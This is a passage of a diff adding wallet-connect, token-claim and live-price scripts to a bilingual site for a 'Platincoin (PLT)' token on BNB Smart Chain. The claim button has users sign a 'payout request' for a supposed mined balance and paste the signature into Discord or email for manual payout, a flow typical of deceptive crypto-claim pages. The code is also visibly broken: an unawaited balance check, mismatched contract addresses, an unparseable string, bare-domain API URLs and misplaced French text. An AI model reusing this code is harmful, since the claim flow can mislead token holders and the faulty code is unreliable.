+  var c = prompt("Scegli il tuo wallet mobile (1, 2 o 3):\n\n1 = MetaMask\n2 = Trust Wallet\n3 = Phantom", "1");
+  if (!c) return;
+  c = c.trim();
+  if (c === "2") {
+    window.location.href = "https://link.trustwallet.com/open_url?coin_id=20000714&url=https://" + d;
+  } else if (c === "3") {
+    var t = encodeURIComponent("https://" + d);
+    window.location.href = "https://phantom.app/ul/browse/" + t + "?ref=" + t;
+  } else {
+    window.location.href = "https://metamask.app.link/dapp/" + d;
+  }
+}
+
+    if (!providerObj) {
+        statusMsg.style.color = "red";
+        statusMsg.innerText = isEnglish 
+            ? "No Web3 wallet detected. Please install MetaMask, Trust Wallet or Phantom." 
+            : "Nessun wallet Web3 rilevato. Installa MetaMask, Trust Wallet o Phantom.";
+        openMobileWalletFallback();
+        return;
+    }
+
+    try {
+        statusMsg.style.color = "orange";
+        statusMsg.innerText = isEnglish ? "Connecting wallet..." : "Connessione al wallet in corso...";
+
+        // Usa lo stesso metodo diretto del pulsante funzionante
+        const accounts = await providerObj.request({ method: 'eth_requestAccounts' });
+        userAddress = accounts[0];
+
+        // Accorcia l'indirizzo (es. 0x1234...abcd)
+        const shortenedAddress = userAddress.substring(0, 6) + "..." + userAddress.substring(userAddress.length - 4);
+
+        if (isEnglish) {
+            document.getElementById('walletAddress').innerHTML = `Connected: <strong style="color: #00ffcc;">${shortenedAddress}</strong>`;
+            document.getElementById('connectBtn').innerText = "Connected ✓";
+        } else {
+            document.getElementById('walletAddress').innerHTML = `Connesso: <strong style="color: #00ffcc;">${shortenedAddress}</strong>`;
+            document.getElementById('connectBtn').innerText = "Connesso ✓";
+        }
+
+        document.getElementById('connectBtn').style.backgroundColor = "#2e7d32";
+        statusMsg.innerText = "";
+
+        // Abilita il pulsante viola di Claim
+        if (typeof userAddress !== 'undefined' && userAddress) { refreshConnectedWalletBalance(userAddress); }
+            const claimBtn = document.getElementById('claimBtn');
+        if (claimBtn) {
+            claimBtn.disabled = false;
+            claimBtn.style.cursor = "pointer";
+            claimBtn.style.backgroundColor = "#6a1b9a";
+        }
+
+    } catch (error) {
+        console.error("Errore connessione:", error);
+        statusMsg.style.color = "red";
+        statusMsg.innerText = isEnglish 
+            ? "Connection rejected or failed." 
+            : "Connessione rifiutata o fallita.";
+    }
+});
+
+    // 4. Logica del Pulsante di Claim per il test con blocco anti-doppio clic
+document.getElementById('claimBtn').addEventListener('click', async () => {
+    if (!userAddress) return;
+
+    const claimBtn = document.getElementById('claimBtn');
+    const statusMsg = document.getElementById('statusMessage');
+
+    // GESTIONE DEI PULSANTI: Attiva lo stato di caricamento e blocca i doppi clic
+    claimBtn.disabled = true;
+    claimBtn.style.cursor = "not-allowed";
+    claimBtn.style.backgroundColor = "#4d1d7a"; // Colore viola scuro di caricamento
+
+// Testo di attesa bilingue istantaneo
+    statusMsg.style.color = "orange";
+    statusMsg.innerHTML = `
+        <span class="lang-en">Processing Web3 Transaction... Please confirm on Phantom.</span>
+        <span class="lang-it">Preparazione transazione Web3 in corso... Autorizza su Phantom.</span>
+    `;
+
+    try {
+        const verifiedBal = refreshConnectedWalletBalance(userAddress);
+        if (verifiedBal <= 0) {
+            statusMsg.style.color = "#ef4444";
+            statusMsg.innerHTML = `
+                <span class="lang-en">No mined PLT balance verified on-chain for this wallet (0.00 PLT).</span>
+                <span class="lang-it">Nessun saldo PLT minato verificato per questo wallet (0.00 PLT).</span>
+            `;
+            return;
+        }
+        const msgToSign = `Platincoin (PLT) Official Payout Request
+Wallet: ${userAddress}
+Verified Mined Balance: ${verifiedBal.toFixed(2)} PLT
+Timestamp: ${new Date().toISOString()}`;
+        const prov = window.ethereum || (window.phantom && window.phantom.ethereum);
+        if (!prov) throw new Error("No Web3 provider");
+        const signature = await prov.request({ method: 'personal_sign', params: [msgToSign, userAddress] });
+        const receipt = `🔐 PLATINCOIN (PLT) PAYOUT CLAIM
+Wallet: ${userAddress}
+Amount: ${verifiedBal.toFixed(2)} PLT
+Signature: ${signature}`;
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            try { await navigator.clipboard.writeText(receipt); } catch (_) {}
+        }
+        statusMsg.style.color = "#10b981";
+        statusMsg.innerHTML = `
+            <span class="lang-en">✅ Signed receipt (${verifiedBal.toFixed(2)} PLT) copied! Paste it in our <a href="https://discord.gg" target="_blank" style="color:#38bdf8;text-decoration:underline;">Discord</a> or <a href="mailto:info@platincoin-plt.org?subject=PLT%20Payout%20Request&body=${encodeURIComponent(receipt)}" style="color:#38bdf8;text-decoration:underline;">Email</a> for manual processing.</span>
+            <span class="lang-it">✅ Ricevuta firmata (${verifiedBal.toFixed(2)} PLT) copiata! Incollala su <a href="https://discord.gg" target="_blank" style="color:#38bdf8;text-decoration:underline;">Discord</a> o inviala via <a href="mailto:info@platincoin-plt.org?subject=Richiesta%20Payout%20PLT&body=${encodeURIComponent(receipt)}" style="color:#38bdf8;text-decoration:underline;">Email</a> per l'invio on-chain.</span>
+        `;
+    } catch (error) {
+        console.error("Transazione fallita:", error);
+        statusMsg.style.color = "red";
+        statusMsg.innerHTML = `
+            <span class="lang-en">Transaction cancelled or failed.</span>
+            <span class="lang-it">Transazione annullata o fallita.</span>
+        `;
+
+        // RIPRISTINO DEL PULSANTE in caso di errore per permettere un nuovo tentativo
+        claimBtn.disabled = false;
+        claimBtn.style.cursor = "pointer";
+        claimBtn.style.backgroundColor = "#6a1b9a";
+    }
+
+    // Forza il browser a riapplicare la lingua corretta sui messaggi inseriti
+    if (typeof updateLanguageDisplay === 'function') updateLanguageDisplay();
+});
+
+
+function downloadPaperWallet() {
+    const wallet = userAddress || "Non connesso / Not connected";
+    const supply = document.getElementById('live-supply-web3').innerText || "0.00";
+    const date = new Date().toLocaleString();
+    
+    const content = `=========================================\n` +
+                    `   PLATINCOIN (PLT) - OFFICIAL BACKUP    \n` +
+                    `=========================================\n\n` +
+                    `Data Generazione / Date: ${date}\n` +
+                    `Indirizzo Wallet / Address: ${wallet}\n` +
+                    `Saldo Rilevato / Balance: ${supply} PLT\n` +
+                    `Smart Contract (BSC): 0xF34c49593E7a67Ec34CADADb5c34e024d1d3Ac8\n` +
+                    `Rete / Network: BNB Smart Chain (BEP-20)\n\n` +
+                    `Conserva questo documento in un luogo sicuro.\n` +
+                    `=========================================`;
+
+    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+    const link = document.createElement('a');
+    link.href = URL.createObjectURL(blob);
+    link.download = `Platincoin_Backup_${Date.now()}.txt`;
+    link.click();
+}
+
+async function addTokenToWallet() {
+    const providerObj = window.ethereum || window.phantom?.ethereum;
+    const statusMsg = document.getElementById('statusMessage');
+    const isEnglish = window.getComputedStyle(document.querySelector('.lang-en')).display !== 'none';
+
+    if (!providerObj) {
+        statusMsg.style.color = "red";
+        statusMsg.innerText = isEnglish 
+            ? "No Web3 wallet detected. Please install MetaMask, Trust Wallet or Phantom." 
+            : "Nessun wallet Web3 rilevato. Installa MetaMask, Trust Wallet o Phantom.";
+        openMobileWalletFallback();
+        return;
+    }
+
+    try {
+        statusMsg.style.color = "orange";
+        statusMsg.innerText = isEnglish ? "Connecting to wallet..." : "Connessione al wallet in corso...";
+
+        await providerObj.request({ method: 'eth_requestAccounts' });
+
+        try {
+            await providerObj.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x38' }],
+            });
+        } catch (switchError) {
+            // Ignora se la rete BNB Chain è già selezionata
+        }
+
+        const wasAdded = await providerObj.request({
+            method: 'wallet_watchAsset',
+            params: {
+                type: 'ERC20',
+                options: {
+                    address: '0xF34c49593E7a67Ec34CADADb5c34e024d1d3Ac8',
+                    symbol: 'PLT',
+                    decimals: 18
+                },
+            },
+        });
+
+        if (wasAdded) {
+            statusMsg.style.color = "#00ffcc";
+            statusMsg.innerText = isEnglish ? "PLT added successfully!" : "PLT aggiunto con successo!";
+        }
+    } catch (error) {
+        console.error("Errore importazione:", error);
+        statusMsg.style.color = "red";
+        statusMsg.innerText = isEnglish 
+            ? "Auto-import blocked by this wallet. Please copy the contract from the backup file." 
+            : "Importazione automatica bloccata da questo wallet. Copia il contratto dal file di backup.";
+    }
+}
+
+
+</script>
+
+
+<script>(function(){const T="0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8",P="0xa51e99928c39ae656b7cb38006b8a1d220479b2c",U="0x55d398326f99059fF775485246999027B3197955",SW="https://pancakeswap.finance/swap?inputCurrency="+U+"&outputCurrency="+T,CH="https://www.geckoterminal.com/api/v2/networks/bsc/pools/"+P,PL="https://pinksale.finance/pinklock/bsc/record/2113264";function isIta(){return document.body.innerText.includes("FORNITURA MASSIMA")||document.body.innerText.includes("Acquista PLT");}function renderBox(bx){const it=isIta();const title=it?"MERCATO LIVE ATTIVO - PLT / USDT SU PANCAKESWAP":"LIVE MARKET ACTIF - PLT / USDT ON PANCAKESWAP";const desc=it?"Pool di liquidità attiva su BNB Smart Chain con 0% tasse e blocco PinkLock di 365 giorni.":"Liquidity pool is live on BNB Smart Chain with 0% tax and 365-day PinkLock protection.";const b1=it?"Scambia PLT / USDT ↗":"Trade PLT / USDT ↗";const b2=it?"Prova Blocco LP 1 Anno 🔒":"1-Year LP Lock Proof 🔒";bx.innerHTML='<div style="text-align:center;padding:8px 4px;"><div style="color:#10b981;font-weight:700;font-size:1rem;letter-spacing:0.5px;margin-bottom:6px;">'+title+'</div><div style="font-size:0.88rem;color:#94a3b8;margin-bottom:16px;">'+desc+'</div><div style="display:flex;gap:12px;justify-content:center;align-items:center;flex-wrap:wrap;"><a href="'+SW+'" target="_blank" style="display:inline-flex;align-items:center;justify-content:center;background:#10b981;color:#020617;font-weight:700;font-size:0.9rem;padding:10px 20px;border-radius:8px;text-decoration:none;border:1px solid #10b981;">'+b1+'</a><a href="'+PL+'" target="_blank" style="display:inline-flex;align-items:center;justify-content:center;background:#1e293b;color:#facc15;font-weight:600;font-size:0.9rem;padding:10px 20px;border-radius:8px;text-decoration:none;border:1px solid rgba(250,204,21,0.45);">'+b2+'</a></div></div>';}function initLiveUI(){document.querySelectorAll("a,button").forEach(b=>{const t=b.textContent.trim();if(t.includes("Buy PLT")||t.includes("Acquista PLT")){if(b.tagName==="A"){b.href=SW;b.target="_blank";}else{b.onclick=function(ev){ev.preventDefault();window.open(SW,"_blank");};}}if(t.includes("Live Chart")||t.includes("Grafico")){if(b.tagName==="A"){b.href=CH;b.target="_blank";}else{b.onclick=function(ev){ev.preventDefault();window.open(CH,"_blank");};}}});const inp=document.querySelector("input[type=email],input[placeholder*=email]");if(inp&&inp.parentElement&&inp.parentElement.parentElement){const bx=inp.parentElement.parentElement;bx.id="live-market-box";renderBox(bx);}else{const bx=document.getElementById("live-market-box");if(bx)renderBox(bx);}}async function sync(){try{const r=await fetch("https://api.geckoterminal.com/api/v2/networks/bsc/pools/"+P,{headers:{"Accept":"application/json"}});const j=await r.json();const attr=j&&j.data&&j.data.attributes;if(!attr)return;const pr=parseFloat(attr.base_token_price_usd)||parseFloat(attr.quote_token_price_usd);const c24=attr.price_change_percentage&&attr.price_change_percentage.h24!==undefined?parseFloat(attr.price_change_percentage.h24):null;if(isNaN(pr))return;document.querySelectorAll("*").forEach(e=>{if(e.children.length===0&&e.textContent.trim().startsWith("$")&&!isNaN(parseFloat(e.textContent.trim().slice(1)))){e.textContent="$"+(pr<0.01?pr.toFixed(6):pr.toFixed(4));if(e.nextElementSibling)e.nextElementSibling.textContent=(isIta()?"Prezzo Live PancakeSwap":"<span class="lang-en">Live PancakeSwap Price</span><span class="lang-it" style="display:none;">Prezzo Live PancakeSwap</span>")+(c24!==null?" ("+(c24>=0?"+":"")+c24.toFixed(2)+"% 24h)":"");if(e.previousElementSibling)e.previousElementSibling.textContent=isIta()?"PREZZO LIVE DI MERCATO":"LIVE MARKET PRICE";}});}catch(e){}}initLiveUI();sync();setInterval(sync,15000);setInterval(initLiveUI,800);})();</script>
+
+
+<script>
+(function(){
+  const API_POOL = "https://geckoterminal.com";
+  async function refreshAllLivePrices(){
+    try {
+      const res = await fetch(API_POOL, { headers: { "Accept": "application/json" }, cache: "no-store" });
+      const json = await res.json();
+      const attr = json && json.data && json.data.attributes;
+      if (!attr) return;
+      const pr = parseFloat(attr.base_token_price_usd) || parseFloat(attr.quote_token_price_usd);
+      if (!pr || isNaN(pr)) return;
+      const fmt = "$" + pr.toFixed(6);
+      ["tk-live-price", "top-live-price", "plt-tr-price"].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.textContent = fmt;
+      });
+    } catch(e) {}
+  }
+  refreshAllLivePrices();
+  setInterval(refreshAllLivePrices, 15000);
+})();
+</script>
+
+<script>
+(function(){
+  window.__PLT_PRICE_NUM = 0.00974;
+  window.__PLT_PRICE_STR = "$0.00974";
+  const PAIR = "0xa51e99928c39ae656b7cb38006b8a1d220479b2c";
+  const PLT  = "0xf34c49593e7a67ec34cadadb5c34e0b24d1d3ac8";
+  const API  = "https://api.geckoterminal.com/api/v2/networks/bsc/pools/" + PAIR;
+
+  function applyPrice(p){
+    if (!p || isNaN(p) || p <= 0) return;
+    window.__PLT_PRICE_NUM = p;
+    window.__PLT_PRICE_STR = "$" + p.toFixed(5);
+    document.querySelectorAll(".plt-live-val, #tk-live-price, #top-live-price, #plt-tr-price").forEach(el => {
+      el.textContent = window.__PLT_PRICE_STR;
+    });
+  }
+
+  async function fetchOnChainOrApi(){
+    try {
+      // Lettura diretta delle riserve dalla pool PancakeSwap V2 su BNB Chain
+      const r1 = await fetch("https://binance.org", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_call", params: [{ to: PAIR, data: "0x0902f1ac" }, "latest"] })
+      });
+      const j1 = await r1.json();
+      if (j1 && j1.result && j1.result.length >= 130) {
+        const res0 = Number(BigInt("0x" + j1.result.slice(2, 66))) / 1e18;
+        const res1 = Number(BigInt("0x" + j1.result.slice(66, 130))) / 1e18;
+        // token0 è USDT (0x55d3...) e token1 è PLT (0xf34c...)
+        const price = res0 / res1;
+        if (price > 0 && isFinite(price)) { applyPrice(price); return; }
+      }
+    } catch(e) {}
+    try {
+      const r2 = await fetch(API, { headers: { "Accept": "application/json" }, cache: "no-store" });
+      const j2 = await r2.json();
+      const attr = j2 && j2.data && j2.data.attributes;
+      const p2 = attr && (parseFloat(attr.base_token_price_usd) || parseFloat(attr.quote_token_price_usd));
+      if (p2) applyPrice(p2);
+    } catch(e) {}
+  }
+
+  fetchOnChainOrApi();
+  setInterval(fetchOnChainOrApi, 10000);
+})();
+</script>
+
+
+<style>
+  .lang-btn { display: none !important; }
+  .lang-it { display: none !important; }
+  #plt-right-controls { display: inline-flex !important; align-items: center !important; gap: 10px !important; margin-left: auto !important; }
+  #plt-lang-wrap { position: relative !important; display: inline-flex !important; align-items: center !important; z-index: 1005 !important; }
+  #plt-lang-drop { position: absolute !important; top: 48px !important; right: 0 !important; min-width: 190px !important; background: #111827 !important; border: 1px solid rgba(52,211,153,0.4) !important; border-radius: 12px !important; padding: 6px !important; box-shadow: 0 18px 40px rgba(0,0,0,0.8) !important; z-index: 1010 !important; }
+  #plt-lang-drop button { display: flex !important; align-items: center !important; justify-content: space-between !important; width: 100% !important; padding: 10px 12px !important; background: transparent !important; border: none !important; border-radius: 8px !important; color: #f8fafc !important; font-size: 13px !important; font-weight: 700 !important; cursor: pointer !important; text-align: left !important; }
+  #plt-lang-drop button:hover { background: rgba(52,211,153,0.12) !important; }
+  #plt-lang-drop button.plt-opt-active { background: rgba(52,211,153,0.2) !important; color: #34d399 !important; }
+  div:not(#plt-right-controls):not(#wp-lang-wrap) > #plt-lang-wrap, #plt-lang-dropdown, #lang-dd-menu { display: none !important; }
+</style>
+<script>
+localStorage.setItem('plt_lang', 'en');
+try{if(typeof setDocsLang==='function')setDocsLang('en');}catch(e){}
+try{if(typeof setContactLang==='function')setContactLang('en');}catch(e){}
+try{if(typeof setL==='function')setL('en');}catch(e){}
+window.switchLang = window.setDocsLang = window.setContactLang = window.setL = function(){};
+window.addEventListener('DOMContentLoaded', () => {
+  const menuBtn = document.getElementById('plt-menu-toggle') || document.querySelector('#plt-hamburger-bar > button');
+  const bar = document.getElementById('plt-hamburger-bar') || (menuBtn && menuBtn.parentElement);
+  const mainDrop = document.getElementById('plt-dropdown-menu') || document.getElementById('m');
+  
+  document.querySelectorAll('button, div').forEach(el => {
+    if(el.closest('#plt-right-controls')) return;
+    const t = el.textContent.replace(/\s+/g, ' ').trim();
+    if((t === '🌐 FR ▾' || t === 'FR ▾') && el.children.length <= 2) el.style.display = 'none';
+  });
+  if(bar && menuBtn && !document.getElementById('plt-right-controls')){
+    const controls = document.createElement('div');
+    controls.id = 'plt-right-controls';
+    const cur = location.pathname.split('/').pop() || 'index-fr.html';
+    const base = cur.replace('-fr.html', '.html');
+    const es = cur.replace('-fr.html', '-es.html');
+    const langWrap = document.createElement('div');
+    langWrap.id = 'plt-lang-wrap';
+    langWrap.innerHTML =
+      '<button type="button" id="plt-lang-toggle" style="height:38px;padding:0 12px;border-radius:10px;border:1px solid rgba(52,211,153,0.38);background:rgba(52,211,153,0.12);color:#f8fafc;font-size:12.5px;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;gap:6px;white-space:nowrap;">🌐 <span id="plt-lang-label">FRA ▾</span></button>' +
+      '<div id="plt-lang-drop" style="display:none;">' +
+        '<button type="button" onclick="localStorage.setItem(\'plt_lang\',\'en\');location.href=\''+base+'\'"><span>🇬🇧 ENGLISH (ENG)</span></button>' +
+        '<button type="button" onclick="localStorage.setItem(\'plt_lang\',\'it\');location.href=\''+base+'\'" style="margin-top:4px;"><span>🇮🇹 ITALIANO (ITA)</span></button>' +
+        '<button type="button" onclick="location.href=\''+es+'\'" style="margin-top:4px;"><span>🇪🇸 ESPAÑOL (ESP)</span></button>' +
+        '<button type="button" class="plt-opt-active" style="margin-top:4px;"><span>🇫🇷 FRANÇAIS (FRA)</span><span>✓</span></button>' +
+      '</div>';
+    bar.insertBefore(controls, menuBtn);
+    controls.appendChild(langWrap);
+    controls.appendChild(menuBtn);
+    const lb = document.getElementById('plt-lang-toggle');
+    const ld = document.getElementById('plt-lang-drop');
+    lb.addEventListener('click', (e) => {
+      e.stopPropagation();
+      if(mainDrop) mainDrop.style.display = 'none';
+      ld.style.display = (ld.style.display === 'block') ? 'none' : 'block';
+    });
+    menuBtn.addEventListener('click', () => { ld.style.display = 'none'; }, true);
+    document.addEventListener('click', (e) => {
+      if(!e.target.closest('#plt-lang-wrap')) ld.style.display = 'none';
+      if(mainDrop && !e.target.closest('#plt-right-controls') && !e.target.closest('#plt-dropdown-menu') && !e.target.closest('#m')) mainDrop.style.display = 'none';
+    });
+  }
+});
+</script>
+</body>
+</html>
